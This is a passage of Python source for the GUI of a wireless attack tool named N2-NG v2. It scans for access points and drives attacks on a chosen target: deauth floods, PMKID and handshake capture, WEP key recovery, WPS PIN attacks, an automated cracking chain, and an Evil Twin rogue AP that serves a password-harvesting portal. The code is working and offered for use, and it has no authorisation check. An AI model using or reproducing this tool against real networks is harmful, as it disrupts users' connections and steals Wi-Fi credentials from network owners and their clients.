        if not self.mon_iface:
            messagebox.showwarning("N2-NG v2", "Start monitor mode first.")
            return
        if self._scanning.is_set():
            return
        self._scanning.set()
        self.scan_btn.configure(text="Stop Scanning")
        self._log("scanning started")

        def loop():
            import time

            from scapy.sendrecv import sniff

            from ..frames import bssid_of
            from ..radio import ALL_CHANNELS, ChannelHopper
            from ..scan import ScanResult, process_packet

            # One persistent hopper for the whole scanning session, not a
            # fresh one per pass — matches how airodump-ng actually works
            # (confirmed via --help: one continuous hop loop, incremental
            # display, never restarts). The old design called scan() in a
            # loop, which builds a brand-new ChannelHopper every time — its
            # channel index always restarted at 0, so with hop() costing a
            # full dwell itself (0.3s) *plus* the 0.3s sniff (0.6s/channel,
            # 13.2s for a full 22-channel sweep), a short bounded duration
            # never reached 5GHz at all, not just less often. process_packet
            # already merges correctly into a persistent ScanResult (fixed
            # 2026-08-19), so this also drops the GUI's own duplicate merge
            # logic that used to sit here.
            result = ScanResult(aps=self.aps)
            hopper = ChannelHopper(iface=self.mon_iface, channels=self._scan_channels or list(ALL_CHANNELS))

            def on_packet(pkt):
                bssid = bssid_of(pkt)
                had_ssid = result.aps[bssid].ssid if bssid in result.aps else None
                process_packet(pkt, result)
                if bssid and bssid in result.aps and not had_ssid and result.aps[bssid].ssid:
                    self._log(f"revealed hidden SSID: {result.aps[bssid].ssid} ({bssid})")

            while self._scanning.is_set():
                # An attack (deauth/capture/PMKID/WPS/PINCER/auto-deauth)
                # needs exclusive use of mon_iface. Without this check the
                # scan loop kept opening/closing its own sniff() socket on
                # the same interface every dwell period even while an
                # attack was running, which starved both TX (deauth frames
                # never actually went out — confirmed via `ip -s link`
                # showing 0 TX packets) and RX (capture files came back
                # with 0 packets) and occasionally raised a real ENETDOWN
                # from the resulting socket churn. Pause hopping/sniffing
                # entirely while busy instead of fighting over the radio.
                if self._busy:
                    time.sleep(0.3)
                    continue
                # Locked/unlocked can change mid-session (double-click a
                # different target, hit Unlock) — pick that up each hop
                # rather than only at loop start.
                wanted = self._scan_channels or list(ALL_CHANNELS)
                if hopper.channels != wanted:
                    hopper.channels = wanted
                hopper.hop()
                try:
                    sniff(iface=self.mon_iface, timeout=hopper.dwell, prn=on_packet, store=False)
                except Exception as exc:
                    # Transient: some drivers (e.g. mt76x0u) briefly drop the
                    # link during a fast 2.4->5GHz channel hop, which makes
                    # scapy's L2 socket setup fail for that one dwell window
                    # (observed live: "[Errno 100] Network is down"). Treating
                    # that as fatal silently killed the whole scan session —
                    # button still said "Stop Scanning" but nothing was being
                    # captured, which reads as "this adapter just sees fewer
                    # APs" rather than "the scan died a few seconds in".
                    self._log(f"scan hop failed, retrying: {exc}")
                    time.sleep(0.5)
                    continue
                if self.locked_bssid and self.locked_bssid in result.aps:
                    self._lock_lost_since = None
                # Signal graph follows whatever's SELECTED, not just locked
                # (2026-08-26 live-test note: single-click a row should
                # immediately start updating the graph, not just after a
                # double-click lock — selected_bssid equals locked_bssid
                # once you do lock, since selection fires with the click).
                if self.selected_bssid and self.selected_bssid in result.aps:
                    self._queue.put(("signal_sample", result.aps[self.selected_bssid].signal))
                self._queue.put(("scan_update", None))

        self._scan_thread = threading.Thread(target=loop, daemon=True)
        self._scan_thread.start()

    def _stop_scan(self):
        self._scanning.clear()
        self.scan_btn.configure(text="Start Scanning")
        self._log("scanning stopped")

    def _matches_security_filter(self, ap: AccessPoint) -> bool:
        filt = self.security_filter_var.get()
        sec = (ap.security or "").lower()
        if filt == "All":
            return True
        if filt == "Open":
            return sec == "open"
        if filt == "WEP":
            return sec == "wep"
        if filt == "WPA/WPA2":
            return sec in ("wpa", "wpa2")
        if filt == "WPA3":
            return sec == "wpa3"
        if filt == "Transition":
            return sec == "transition"
        return True

    def _render_targets(self):
        selected = self.selected_bssid
        self.tree.delete(*self.tree.get_children())
        rows = [ap for ap in self.aps.values() if self._matches_security_filter(ap)]

        if self._sort_col is None:
            rows.sort(key=lambda ap: ap.bssid)
        else:
            key_fn = {
                "bssid": lambda ap: ap.bssid,
                "ssid": lambda ap: (ap.ssid or "").lower(),
                "channel": lambda ap: ap.channel if ap.channel is not None else -1,
                "security": lambda ap: ap.security or "",
                "pmf": lambda ap: ap.pmf or "",
                "wps": lambda ap: ap.wps or "",
                "signal": lambda ap: ap.signal if ap.signal is not None else -999,
            }[self._sort_col]
            rows.sort(key=key_fn, reverse=self._sort_reverse)

        wps_display = {"enabled": "yes", "locked": "locked"}
        for i, ap in enumerate(rows):
            band_tag = "row_even" if i % 2 == 0 else "row_odd"
            self.tree.insert("", tk.END, iid=ap.bssid, values=(
                ap.bssid, self._display_ssid(ap.ssid) if ap.ssid else "<hidden>", ap.channel or "-", ap.security or "-",
                ap.pmf or "-", wps_display.get(ap.wps, "-"), ap.signal if ap.signal is not None else "-",
            ), tags=((ap.security or "unknown").lower(), band_tag))
        if selected and self.tree.exists(selected):
            self.tree.selection_set(selected)

    def _on_target_heading_click(self, col: str):
        """Click a column heading to sort by it; click again to reverse (v1 _on_header_click)."""
        numeric_cols = {"channel", "signal"}
        if self._sort_col == col:
            self._sort_reverse = not self._sort_reverse
        else:
            self._sort_col = col
            self._sort_reverse = col in numeric_cols
        for key, heading, _width in TARGET_COLUMNS:
            if self._sort_col == key:
                arrow = "▼" if self._sort_reverse else "▲"
                self.tree.heading(key, text=f"{heading} {arrow}")
            else:
                self.tree.heading(key, text=heading)
        self._render_targets()

    def _on_target_right_click(self, event):
        region = self.tree.identify_region(event.x, event.y)
        if region == "heading":
            self._show_column_menu(event)
            return
        row = self.tree.identify_row(event.y)
        if not row:
            return
        self.tree.selection_set(row)
        self.root.clipboard_clear()
        self.root.clipboard_append(row)
        self.status_var.set(f"Copied BSSID {row} to clipboard")

    def _apply_column_visibility(self):
        """displaycolumns, not width=0 — a zero-width column is still a
        clickable sliver in ttk.Treeview, this actually removes it."""
        visible = [key for key, _, _ in TARGET_COLUMNS if key not in self.hidden_columns]
        self.tree["displaycolumns"] = visible

    def _show_column_menu(self, event):
        """Right-click a column header to show/hide it (v1's column-
        visibility menu, main.py 3281-3325, deferred earlier since it
        wanted settings persistence first — now wired to it). BSSID stays
        pinned, it's the row identity, same as it's excluded from sorting."""
        menu = tk.Menu(self.root, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        for key, heading, _width in TARGET_COLUMNS:
            if key == "bssid":
                continue
            var = tk.BooleanVar(value=key not in self.hidden_columns)

            def toggle(key=key, var=var):
                if var.get():
                    self.hidden_columns.discard(key)
                else:
                    self.hidden_columns.add(key)
                self._apply_column_visibility()

            menu.add_checkbutton(label=heading, variable=var, command=toggle)
        menu.tk_popup(event.x_root, event.y_root)

    def _on_target_select(self, _event=None):
        """Single click/selection: preview only — detail panel + client
        list. Does NOT touch the radio. User feedback (2026-08-19):
        auto-locking on every single click changed the channel just from
        browsing the list, which fights a scan in progress. Locking is
        now a deliberate double-click (_on_target_double_click)."""
        sel = self.tree.selection()
        if not sel:
            return
        bssid = sel[0]
        self.selected_bssid = bssid
        ap = self.aps.get(bssid)
        if not ap:
            return
        self.target_title_var.set(f"{ap.ssid or '<hidden>'}  ({bssid})")
        self.target_detail_var.set(
            f"Channel: {ap.channel or '-'}    Security: {ap.security or '-'}    "
            f"PMF: {ap.pmf or '-'}    Signal: {ap.signal if ap.signal is not None else '-'} dBm\n"
            f"Clients seen: {len(ap.clients)}"
        )
        self.client_tree.delete(*self.client_tree.get_children())
        for mac in sorted(ap.clients):
            signal = ap.client_signal.get(mac)
            self.client_tree.insert("", tk.END, iid=mac, values=(mac, signal if signal is not None else "-"))

        # Selecting a row should immediately show its signal history and any
        # existing capture data, not wait for a lock (2026-08-26 live-test
        # note). Seed with the last-known signal so the graph isn't empty
        # while waiting for the next scan hop to land on this AP's channel.
        self.signal_graph.reset()
        if ap.signal is not None:
            self.signal_graph.add_sample(ap.signal)
        self._start_selected_capture_watch(ap)

    def _start_selected_capture_watch(self, ap: AccessPoint):
        """Live KB readout of any existing capture data for the selected
        target — v1 parity (main.py's capture-size monitor was tied to
        selection there too). Reads whatever's already on disk; a running
        attack's own _watch_capture_size call takes priority and this backs
        off (checked via self._busy) so the two don't fight over the same
        capture_size_var."""
        if self._select_capture_watch_stop is not None:
            self._select_capture_watch_stop.set()
        stop_event = threading.Event()
        self._select_capture_watch_stop = stop_event

        from ..storage import target_capture_dir

        capture_dir = target_capture_dir(ap.ssid, ap.bssid, create=False)

        def watch():
            while not stop_event.is_set():
                if not self._busy:
                    try:
                        size = sum(f.stat().st_size for f in capture_dir.glob("**/*") if f.is_file()) \
                            if capture_dir.exists() else 0
                    except OSError:
                        size = 0
                    self._queue.put(("capture_size", size))
                stop_event.wait(1)

        threading.Thread(target=watch, daemon=True).start()

    def _on_target_double_click(self, _event=None):
        """Double-click: the deliberate action that actually locks the
        channel (v1 discipline, main.py _select_target — but v1 used a
        single click; split here per direct user feedback so browsing
        the list doesn't fight an active scan)."""
        bssid = self.selected_bssid
        if not bssid:
            return
        ap = self.aps.get(bssid)
        if ap and ap.channel:
            self._lock_channel(ap)

    def _selected_client(self) -> str | None:
        sel = self.client_tree.selection()
        return sel[0] if sel else None

    def _lock_channel(self, ap: AccessPoint):
        """Stop hopping and park the adapter on ap's channel (v1 _lock_channel)."""
        self.channel_locked = True
        self.locked_bssid = ap.bssid
        self.locked_channel = ap.channel
        self._lock_lost_since = None
        self._scan_channels = [ap.channel]
        # No reset here: _on_target_select already reset+seeded the graph
        # for this same bssid (selection always fires before/with the
        # double-click that reaches this method) — resetting again would
        # just throw away that seed point for no reason.
        self.channel_lock_var.set(f"🔒 LOCKED CH {ap.channel}")
        self.lock_pill.configure(bg=self.THEME["accent"], fg=self.THEME["accent_text"])
        self._log(f"Locked to channel {ap.channel} for {ap.ssid or '<hidden>'} ({ap.bssid})")
        if self.mon_iface and "demo" not in self.mon_iface:
            def work():
                from ..radio import set_channel

                set_channel(self.mon_iface, ap.channel)
                return f"channel {ap.channel}"

            self._run_bg(f"Set channel {ap.channel}", work)

    def _unlock_channel(self):
        """Resume hopping the full channel range (v1 _unlock_channel)."""
        if not self.channel_locked:
            return
        self.channel_locked = False
        self.locked_bssid = None
        self.locked_channel = None
        self._lock_lost_since = None
        self._scan_channels = None
        self.channel_lock_var.set("SCANNING ALL CHANNELS")
        self.lock_pill.configure(bg=self.THEME["error"], fg="#1a0000")
        self._log("Channel lock released; scanning all channels")

    def _check_channel_lock(self):
        """Auto-unlock if the locked target hasn't been seen for CHANNEL_LOCK_TIMEOUT."""
        if self.channel_locked and self.locked_bssid:
            if self.locked_bssid not in self.aps:
                import time

                if self._lock_lost_since is None:
                    self._lock_lost_since = time.monotonic()
                elif time.monotonic() - self._lock_lost_since > CHANNEL_LOCK_TIMEOUT:
                    self._log("Locked target hasn't been seen in 30s; channel lock auto-released")
                    self._unlock_channel()
        self.root.after(5000, self._check_channel_lock)

    def _require_target(self) -> AccessPoint | None:
        if not self.selected_bssid or self.selected_bssid not in self.aps:
            messagebox.showwarning("N2-NG v2", "Select a target from the scan list first.")
            return None
        if not self.mon_iface:
            messagebox.showwarning("N2-NG v2", "Start monitor mode first.")
            return None
        return self.aps[self.selected_bssid]

    # ------------------------------------------------------------------
    # Attacks — every call below hits v2's own native implementation.
    # ------------------------------------------------------------------
    def _confirm_attack(self, title: str, detail: str) -> bool:
        """Modal countdown confirm before firing an attack (v1 CountdownDialog
        port, main.py:1406-1430) — v1 showed the exact shell command; v2 has
        no shell command (native calls), so shows a plain-English summary
        instead. Auto-confirms at 0 unless Cancelled; Execute Now skips the
        wait. Blocks (wait_window) until a choice is made."""
        result = {"go": False}
        dlg = tk.Toplevel(self.root)
        dlg.title("Confirm Attack")
        dlg.configure(bg=self.THEME["bg"])
        dlg.transient(self.root)
        dlg.grab_set()
        dlg.resizable(False, False)

        ttk.Label(dlg, text=title, style="Heading.TLabel").pack(padx=16, pady=(14, 4))
        ttk.Label(dlg, text=detail, style="Muted.TLabel", justify=tk.LEFT, wraplength=380).pack(padx=16, pady=(0, 10))
        count_var = tk.StringVar(value="Executing in 3...")
        ttk.Label(dlg, textvariable=count_var, font=self.fonts["ui_bold"]).pack(pady=(0, 10))

        remaining = [3]
        after_id = [None]

        def go():
            if after_id[0]:
                dlg.after_cancel(after_id[0])
            result["go"] = True
            dlg.destroy()

        def cancel():
            if after_id[0]:
                dlg.after_cancel(after_id[0])
            result["go"] = False
            dlg.destroy()

        def tick():
            remaining[0] -= 1
            if remaining[0] <= 0:
                go()
                return
            count_var.set(f"Executing in {remaining[0]}...")
            after_id[0] = dlg.after(1000, tick)

        btns = ttk.Frame(dlg)
        btns.pack(pady=(0, 14))
        ttk.Button(btns, text="Cancel", command=cancel, style="Danger.TButton").pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Execute Now", command=go, style="Accent.TButton").pack(side=tk.LEFT, padx=6)

        dlg.protocol("WM_DELETE_WINDOW", cancel)
        after_id[0] = dlg.after(1000, tick)
        dlg.wait_window()
        return result["go"]

    def _attack_deauth_all(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("Deauth All Clients", f"Send 64 deauth frames to ALL clients on {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        from ..attacks.deauth import deauth

        self._run_bg(
            f"Deauth all clients on {ap.bssid}", deauth,
            self.mon_iface, ap.bssid, client=BROADCAST, count=64, channel=ap.channel,
        )

    def _attack_deauth_client(self):
        ap = self._require_target()
        if not ap:
            return
        client = self._selected_client()
        if not client:
            messagebox.showwarning("N2-NG v2", "No client selected — pick one from the Clients list.")
            return
        if not self._confirm_attack("Deauth Client", f"Send 64 deauth frames to {client} on {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        from ..attacks.deauth import deauth

        self._run_bg(
            f"Deauth {client} on {ap.bssid}", deauth,
            self.mon_iface, ap.bssid, client=client, count=64, channel=ap.channel,
        )

    def _attack_pmkid(self):
        ap = self._require_target()
        if not ap:
            return
        if not self.own_mac:
            messagebox.showwarning("N2-NG v2", "Own MAC not known yet — restart monitor mode.")
            return
        if not self._confirm_attack("PMKID Attack", f"Clientless PMKID capture against {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        from ..attacks.pmkid import capture_pmkid
        from ..storage import target_capture_dir

        def work():
            line = capture_pmkid(self.mon_iface, ap.bssid, self.own_mac, channel=ap.channel)
            if line is None:
                return "no PMKID captured"
            out_dir = target_capture_dir(ap.ssid, ap.bssid)
            out_file = out_dir / f"pmkid_{int(__import__('time').time())}.22000"
            out_file.write_text(line + "\n")
            return f"saved to {out_file}"

        self._run_bg(f"PMKID attack on {ap.bssid}", work)

    def _attack_handshake(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("Handshake Capture", f"Sniff EAPOL on {ap.bssid} ({ap.ssid or '<hidden>'}) for up to 60s."):
            return
        from ..attacks.handshake import capture_handshake
        from ..storage import target_capture_dir

        def work():
            out_dir = target_capture_dir(ap.ssid, ap.bssid)
            out_file = out_dir / f"handshake_{int(__import__('time').time())}.pcap"
            watch_stop = threading.Event()
            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()
            try:
                cap = capture_handshake(
                    self.mon_iface, ap.bssid, channel=ap.channel, timeout=60.0,
                    outfile=str(out_file), stop_event=self._stop_event,
                )
            finally:
                watch_stop.set()
            if not cap.messages:
                return "no EAPOL traffic seen"
            statuses = [cap.status(a, c).value for a, c in cap.messages]
            return f"{len(cap.messages)} pair(s), statuses={statuses}, saved to {out_file}"

        self._run_bg(f"Handshake capture on {ap.bssid}", work)

    def _attack_smart(self):
        self._omni_style("run_smart")

    def _attack_omni(self):
        self._omni_style("run")

    def _omni_style(self, method: str):
        ap = self._require_target()
        if not ap:
            return
        label = "Smart Attack" if method == "run_smart" else "OMNI Attack"
        if not self._confirm_attack(label, f"Run full {label} chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
            return
        wordlist = self.wordlist_var.get() or None
        capture_dir = self.capture_dir_var.get()
        self._stop_event.clear()

        def work():
            from ..crack.john import JohnCracker, JohnUnavailableError
            from ..omni import OmniOrchestrator

            cracker = None
            if wordlist:
                try:
                    cracker = JohnCracker()
                except JohnUnavailableError as exc:
                    self._log(f"warning: {exc} — will batch hashes but not crack")
            orch = OmniOrchestrator(self.mon_iface, cracker=cracker, capture_dir=capture_dir, stop_event=self._stop_event)
            report = getattr(orch, method)(ap, wordlist=wordlist)
            self._log(report.summary())
            return "cracked" if report.cracked else "no crack"

        self._run_bg(f"{label} on {ap.bssid}", work)

    def _attack_wep(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("N2-NG v2", "WEP attack needs a known SSID (this AP's SSID hasn't been seen yet).")
            return
        if not self.own_mac:
            messagebox.showwarning("N2-NG v2", "Own MAC not known yet — restart monitor mode.")
            return
        key_len = 13
        if not messagebox.askyesno("N2-NG v2", "WEP attack: use WEP-104 (13-byte key)? Choose No for WEP-40 (5-byte)."):
            key_len = 5
        if not self._confirm_attack("WEP Attack", f"Fake-auth + ARP replay + PTW key recovery against {ap.bssid} ({ap.ssid})."):
            return

        from ..attacks.wep import crack_wep

        def work():
            key = crack_wep(self.mon_iface, ap.bssid, self.own_mac, ap.ssid, key_len=key_len,
                            channel=ap.channel, progress_fn=self._progress_fn)
            return key.hex() if key else "no key recovered"

        self._run_bg(f"WEP attack on {ap.bssid}", work)

    def _attack_caffe_latte(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.clients:
            messagebox.showwarning("N2-NG v2", "Caffe Latte needs a visible client — lock a WEP AP with at least one client listed.")
            return
        client_mac = next(iter(ap.clients))
        key_len = 13 if messagebox.askyesno("N2-NG v2", "WEP Caffe Latte: use WEP-104 (13-byte)? No = WEP-40 (5-byte).") else 5
        if not self._confirm_attack(
            "WEP Caffe Latte",
            f"Client-only WEP attack against {client_mac} (client of {ap.bssid}).\n"
            "No AP association needed — replays client ARPs to collect IVs.",
        ):
            return
        from ..attacks.wep_client import caffe_latte

        def work():
            key = caffe_latte(self.mon_iface, client_mac, key_len=key_len, channel=ap.channel,
                              stop_event=self._stop_event, progress_fn=self._progress_fn)
            return key.hex() if key else "no key recovered"

        self._run_bg(f"Caffe Latte on {client_mac}", work)

    def _attack_chopchop(self):
        """DISABLED (2026-08-25): the native ICV-correction math doesn't
        work through WEP's RC4 encryption — confirmed by two independent
        offline verification tests, not just a live failure. See the
        comment above attacks/wep_client.py's chopchop(). This project's
        own vendored/self-compiled aireplay-ng already has a real, working
        -4/--chopchop; driving it from here is future work."""
        messagebox.showwarning(
            "N2-NG v2",
            "WEP Chopchop is disabled — its decryption math doesn't work "
            "against real WEP encryption (verified offline, not just "
            "untested).\n\nThis project's own vendored aireplay-ng build "
            "already has a working -4/--chopchop attack — use that for now.",
        )

    def _attack_wps_null_pin(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("N2-NG v2", "WPS attack needs a known SSID.")
            return
        if not self._confirm_attack("WPS Null-PIN", f"One-shot null-PIN attempt against {ap.bssid} ({ap.ssid})."):
            return
        from ..attacks.wps import null_pin_attack

        def work():
            outcome = null_pin_attack(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel)
            if outcome.network_key:
                return f"{outcome.outcome.value}: key={outcome.network_key}"
            return outcome.outcome.value

        self._run_bg(f"WPS null-PIN on {ap.bssid}", work)

    def _attack_wps_pixie(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("N2-NG v2", "WPS attack needs a known SSID.")
            return
        if not self._confirm_attack(
            "WPS Pixie-Dust",
            f"Offline pixie-dust against {ap.bssid} ({ap.ssid}).\n"
            "Requires one M1→M3 exchange to capture crypto material.",
        ):
            return
        from ..attacks.wps import pixie_attempt

        def work():
            result = pixie_attempt(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel)
            if result.outcome.name == "SUCCESS":
                return f"pixie-dust success: key={result.network_key}"
            # "no vulnerable nonce" is only actually true for FIRST_HALF_WRONG
            # (the offline pixie math ran and found nothing); TIMEOUT/
            # AP_SETUP_LOCKED/AUTH_FAILED/ASSOC_FAILED mean it never got that
            # far — say so plainly instead of mislabeling every failure mode.
            suffix = f" — {result.detail}" if result.detail else ""
            return f"pixie-dust failed: {result.outcome.name}{suffix}"

        self._run_bg(f"WPS pixie-dust on {ap.bssid}", work)

    def _attack_wps_bruteforce(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("N2-NG v2", "WPS attack needs a known SSID.")
            return
        warned = messagebox.askokcancel(
            "N2-NG v2",
            "WPS bruteforce is currently EXPERIMENTAL — across multiple live sessions "
            "it has never completed a real M2→M3 exchange against a test AP (see "
            "STATUS.md). It may just time out repeatedly. Continue anyway?",
        )
        if not warned:
            return
        self._stop_event.clear()
        from ..attacks.wps import wps_pin_bruteforce

        def work():
            result = wps_pin_bruteforce(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, stop_event=self._stop_event)
            if result.success:
                return f"PIN={result.pin} key={result.network_key}"
            if result.ap_setup_locked:
                return "AP setup locked"
            if result.aborted_lockout:
                return f"aborted after repeated timeouts ({result.attempts} attempts)"
            return f"no result ({result.attempts} attempts)"

        self._run_bg(f"WPS bruteforce on {ap.bssid}", work)

    def _stop_attack(self):
        self._stop_event.set()
        self.auto_deauth_var.set(False)
        if hasattr(self, "_auto_deauth_stop"):
            self._auto_deauth_stop.set()
        self._log("stop requested (OMNI/Smart/WPS-bruteforce/auto-deauth loops will exit at their "
                   "next check; a single blocking call in progress will still finish on its own timeout)")

    def _toggle_auto_deauth(self):
        """v1's 'Auto-deauth until handshake' (main.py 2924-2930, 3365-3392):
        deauth the locked target on a timer, independent of OMNI/Smart,
        stopping itself once an AUTHORIZED handshake is actually captured
        — not just after N rounds. v2 has no continuous background EAPOL
        listener the way v1's CaptureManager was, so this starts its own:
        one thread blocks in capture_handshake() with a timeout sized to
        the round budget, a second thread sends the periodic deauth
        bursts; whichever condition hits first (AUTHORIZED capture, toggle
        turned off, or the round budget exhausted) ends the loop."""
        if not self.auto_deauth_var.get():
            if hasattr(self, "_auto_deauth_stop"):
                self._auto_deauth_stop.set()
            self._log("auto-deauth stopped")
            return
        ap = self._require_target()
        if not ap:
            self.auto_deauth_var.set(False)
            return
        if self._busy:
            messagebox.showwarning("N2-NG v2", "Another attack is already running. Use Stop Attack first.")
            self.auto_deauth_var.set(False)
            return
        self._auto_deauth_stop = threading.Event()
        interval = int(self.deauth_interval_var.get())
        self._log(f"auto-deauth started against {ap.bssid} (every {interval}s, stops itself on AUTHORIZED capture)")
        threading.Thread(target=self._auto_deauth_run, args=(ap, interval, self._auto_deauth_stop), daemon=True).start()

    def _format_capture_size(self, size: int | None) -> str:
        if size is None:
            return ""
        if size < 1024:
            return f"Capture: {size} B"
        if size < 1024 ** 2:
            return f"Capture: {size / 1024:.1f} KB"
        return f"Capture: {size / 1024 ** 2:.1f} MB"

    def _watch_capture_size(self, path, stop_event: threading.Event):
        """v1 parity: a live-growing capture-size readout (0 B -> ... KB)
        next to the signal graph, confirming data is actually landing on
        disk during a capture — not just that an attack is 'running'."""
        import time as _time
        from pathlib import Path

        p = Path(path)
        while not stop_event.is_set():
            try:
                size = p.stat().st_size if p.exists() else 0
            except OSError:
                size = 0
            self._queue.put(("capture_size", size))
            _time.sleep(1)
        self._queue.put(("capture_size", None))

    def _auto_deauth_run(self, ap: AccessPoint, interval: int, stop_event: threading.Event):
        import time as _time

        from ..attacks.deauth import deauth
        from ..attacks.handshake import HandshakeStatus, capture_handshake
        from ..storage import target_capture_dir

        max_rounds = 6
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"autodeauth_{int(_time.time())}.pcap"
        result: dict = {}

        def listen():
            result["cap"] = capture_handshake(
                self.mon_iface, ap.bssid, channel=ap.channel,
                timeout=interval * max_rounds + 10, outfile=str(out_file),
                stop_event=stop_event,
            )

        # Marks mon_iface busy so the background scan loop (_start_scan)
        # stops opening its own competing sniff() socket on the same
        # interface for the duration of this run — this bypasses _run_bg
        # (toggle checkbox, not a one-shot attack), so it never set
        # self._busy before, letting the scan loop's per-hop socket churn
        # starve both the deauth TX and the handshake-capture RX.
        self._queue.put(("busy", True))
        try:
            listener = threading.Thread(target=listen, daemon=True)
            listener.start()
            watch_stop = threading.Event()
            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()

            def authorized() -> bool:
                cap = result.get("cap")
                return bool(cap and any(cap.status(a, c) is HandshakeStatus.AUTHORIZED for a, c in cap.messages))

            for round_n in range(max_rounds):
                if stop_event.is_set():
                    break
                try:
                    sent = deauth(self.mon_iface, ap.bssid, count=1, channel=ap.channel)
                    self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {ap.bssid}")
                except Exception as exc:
                    self._log(f"auto-deauth round {round_n + 1} failed: {exc}")
                for _ in range(interval):
                    if stop_event.is_set() or authorized():
                        break
                    _time.sleep(1)
                if authorized():
                    break

            listener.join(timeout=5)
            watch_stop.set()
            if authorized():
                self._log(f"auto-deauth: AUTHORIZED handshake captured -> {out_file}")
            else:
                self._log("auto-deauth: stopped or exhausted rounds, no AUTHORIZED handshake")
        finally:
            self._queue.put(("busy", False))
            self._queue.put(("auto_deauth_done", None))

    def _attack_eviltwin(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("N2-NG v2", "Evil Twin needs a known SSID.")
            return
        iface_ap = self.iface_ap_var.get().strip()
        if not iface_ap:
            messagebox.showerror(
                "N2-NG v2",
                "No AP interface configured.\n\n"
                "Pick one in the toolbar's 'AP iface' dropdown (the ACHM "
                "adapter, in managed mode, distinct from the scan/monitor "
                "adapter).",
            )
            return
        if iface_ap == self.mon_iface:
            messagebox.showerror(
                "N2-NG v2",
                f"AP interface ({iface_ap}) is the same as the monitor "
                f"interface ({self.mon_iface}).\n\n"
                "Evil Twin needs two separate adapters: one to host the "
                "rogue AP, one to stay in monitor mode for deauth.",
            )
            return
        if not self._confirm_attack(
            "Evil Twin",
            f"Rogue AP + captive portal against {ap.bssid} ({ap.ssid}).\n\n"
            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
            "Will deauth real clients and serve a password-harvest portal.",
        ):
            return
        from ..attacks.eviltwin import run_eviltwin

        def work():
            result = run_eviltwin(
                iface_ap=iface_ap,
                iface_mon=self.mon_iface,
                bssid=ap.bssid,
                ssid=ap.ssid,
                channel=ap.channel or 6,
                stop_event=self._stop_event,
            )
            if result.success:
                return f"Evil Twin: password captured → {result.password!r}"
            return f"Evil Twin: {result.detail}"

        self._run_bg(f"Evil Twin on {ap.bssid}", work)

    def _attack_pincer(self):
        """Flagship dual-Alfa mode (STATUS.md 'Ideas/undecided', 2026-08-14
        — one special locked/hidden attack, not folded into the default
        single-adapter path). Split-role, proven live that session: the
        AWUS036ACHM (mt76x0u, wider scan range) stays parked on the
        target's channel doing nothing but listen for the handshake, while
        the AWUS1900 (rtw88_8814au, 4 antennas) does nothing but hammer
        deauth — neither radio ever time-shares between scanning and
        attacking, unlike single-adapter mode. Gated entirely on
        radio.detect_alfa_pair(); the menu entry is disabled without both
        specific adapters present."""
        ap = self._require_target()
        if not ap:
            return
        if not self.alfa_pair:
            messagebox.showwarning("N2-NG v2", "PINCER needs both Alfa adapters connected (AWUS036ACHM + AWUS1900).")
            return
        scan_iface, attack_iface = self.alfa_pair
        if not self._confirm_attack(
            "PINCER (Dual-Alfa)",
            f"{scan_iface} listens on {ap.bssid} ({ap.ssid or '<hidden>'}) while {attack_iface} "
            f"deauths continuously. Both radios go to monitor mode and back when done.",
        ):
            return
        self._stop_event.clear()
        self._run_bg(f"PINCER on {ap.bssid}", self._pincer_run, ap, scan_iface, attack_iface, self._stop_event)

    def _pincer_run(self, ap: AccessPoint, scan_iface: str, attack_iface: str, stop_event: threading.Event) -> str:
        import time as _time

        from ..attacks.deauth import deauth
        from ..attacks.handshake import HandshakeStatus, capture_handshake
        from ..radio import set_channel, set_managed_mode, set_monitor_mode
        from ..storage import target_capture_dir

        randomize = self.randomize_mac_var.get()
        max_rounds = 12  # dedicated attack radio, not sharing time with scanning -> can afford more
        interval = 10
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pincer_{int(_time.time())}.pcap"

        scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize)
        attack_mon, attack_perm_mac = set_monitor_mode(attack_iface, randomize_mac=randomize)
        try:
            if ap.channel:
                set_channel(scan_mon, ap.channel)
                set_channel(attack_mon, ap.channel)

            result: dict = {}

            def listen():
                result["cap"] = capture_handshake(
                    scan_mon, ap.bssid, channel=ap.channel,
                    timeout=interval * max_rounds + 15, outfile=str(out_file),
                    stop_event=stop_event,
                )

            listener = threading.Thread(target=listen, daemon=True)
            listener.start()
            watch_stop = threading.Event()
            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()

            def authorized() -> bool:
                cap = result.get("cap")
                return bool(cap and any(cap.status(a, c) is HandshakeStatus.AUTHORIZED for a, c in cap.messages))

            for round_n in range(max_rounds):
                if stop_event.is_set():
                    break
                sent = deauth(attack_mon, ap.bssid, count=1, channel=ap.channel)
                self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
                for _ in range(interval):
                    if stop_event.is_set() or authorized():
                        break
                    _time.sleep(1)
                if authorized():
                    break

            listener.join(timeout=5)
            watch_stop.set()
        finally:
            set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
